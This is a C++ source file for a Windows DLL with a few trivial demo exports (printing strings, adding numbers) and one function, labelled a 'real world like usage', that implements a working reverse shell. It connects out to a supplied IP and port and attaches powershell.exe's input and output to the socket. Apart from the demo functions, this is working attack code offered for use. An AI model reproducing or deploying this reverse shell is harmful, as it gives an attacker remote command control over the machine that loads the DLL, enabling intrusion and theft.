// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Header.h"

//Demo function for taking strings as input
void __stdcall test_print(const char* str)
{
    printf("%s", str);
}

//Demo function for return values and taking numbers as input
int __stdcall add(int a, int b)
{
    std::cout << a << std::endl << b << std::endl;
    int result = a + b;
    std::cout << result << std::endl;
    return result;
}

//Demo function for printing
void __stdcall hello()
{
    std::cout << "Hello from Dll!" << std::endl;
}

//Demo function for a real world like usage
void __stdcall shell(const char* ip, short port)
{
    std::cout << "IP: " << ip << std::endl;
    std::cout << "Port: " << port << std::endl;

    std::wstring exe = L"powershell.exe";
    
    WSAData data;
    WSAStartup(MAKEWORD(2, 2), &data);

    SOCKET sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    InetPtonA(AF_INET, ip, &addr.sin_addr);

    std::cout << "Looking for connection" << std::endl;
    while (connect(sockfd, (sockaddr*)&addr, sizeof(addr)) != 0)
    {
        Sleep(500);
    }
    std::cout << "Connected!" << std::endl;

    STARTUPINFO startInfo;
    ZeroMemory(&startInfo, sizeof(STARTUPINFO));
    PROCESS_INFORMATION procInfo;

    startInfo.cb = sizeof(STARTUPINFO);
    startInfo.dwFlags = STARTF_USESTDHANDLES;

    startInfo.hStdError = startInfo.hStdInput = startInfo.hStdOutput = (HANDLE)sockfd;
    
    CreateProcessW(NULL, &exe[0], NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo);
    WaitForSingleObject(procInfo.hProcess, INFINITE);
    
    CloseHandle(procInfo.hThread);
    CloseHandle(procInfo.hProcess);
    closesocket(sockfd);
    WSACleanup();
}

//DLL main
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

